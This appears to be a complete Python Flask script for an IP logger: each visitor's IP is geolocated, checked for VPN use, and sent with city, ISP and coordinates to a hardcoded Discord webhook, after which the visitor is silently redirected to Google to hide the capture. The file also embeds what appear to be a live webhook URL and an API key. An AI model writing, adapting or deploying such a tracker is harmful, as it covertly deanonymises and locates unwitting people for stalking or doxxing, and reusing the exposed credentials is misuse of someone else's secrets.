import requests
from flask import Flask, request, redirect

app = Flask(__name__)

# --- CONFIGURATION ---
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1482323306198601780/bvnAqpLHXijSAMi0fwJQV-IZG2nXdoScT4MFttVL3e42cXtol1HiGDGqR1AdsscKDzKG"
IP2LOCATION_API_KEY = "6DE085F79B20D090372DCDAB19FA7413"

@app.route('/')
def capture_and_redirect():
    # 1. Get the Visitor's IP
    # Behind proxies (Heroku/Cloudflare), the real IP is in X-Forwarded-For
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in visitor_ip:
        visitor_ip = visitor_ip.split(',')[0].strip()

    # 2. Get Geolocation & VPN Data
    try:
        api_url = f"https://api.ip2location.io/?key={IP2LOCATION_API_KEY}&ip={visitor_ip}&format=json"
        data = requests.get(api_url).json()
        
        # Extract fields
        vpn_status = "✅ YES" if data.get('is_proxy') else "❌ NO"
        country = data.get('country_name', 'Unknown')
        city = data.get('city_name', 'Unknown')
        isp = data.get('isp', 'Unknown')
        region = data.get('region_name', 'Unknown')
        lat = data.get('latitude', '0')
        lon = data.get('longitude', '0')
        
    except Exception as e:
        print(f"API Error: {e}")
        return redirect("https://www.google.com")

    # 3. Format Discord Embed
    payload = {
        "username": "Captain Hook",
        "embeds": [{
            "title": "🌐 IP Information Captured",
            "color": 15158332 if data.get('is_proxy') else 3066993, # Red if VPN, Green if not
            "fields": [
                {"name": "IP", "value": f"`{visitor_ip}`", "inline": True},
                {"name": "Country", "value": country, "inline": True},
                {"name": "City", "value": city, "inline": True},
                {"name": "Region", "value": region, "inline": True},
                {"name": "ISP", "value": isp, "inline": True},
                {"name": "VPN Enabled", "value": f"**{vpn_status}**", "inline": True},
                {"name": "Latitude", "value": str(lat), "inline": True},
                {"name": "Longitude", "value": str(lon), "inline": True}
            ],
            "footer": {"text": "IP Logger System"}
        }]
    }

    # 4. Send to Discord & Redirect
    requests.post(DISCORD_WEBHOOK_URL, json=payload)
    return redirect("https://www.google.com")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
